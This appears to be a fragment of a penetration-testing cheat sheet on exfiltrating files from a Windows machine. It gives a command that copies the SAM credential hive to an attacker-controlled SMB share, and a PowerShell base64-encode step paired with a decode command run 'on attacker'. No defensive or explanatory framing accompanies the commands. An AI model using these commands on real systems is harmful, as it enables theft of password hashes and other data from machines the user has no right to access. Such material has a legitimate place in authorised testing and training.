```
# Via SMB:
copy C:\Windows\System32\config\SAM \\<LHOST>\share\SAM

# Base64 encode → copy/paste:
[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\file.txt"))
# Decode on attacker:
echo '<BASE64>' | base64 -d > file.txt
```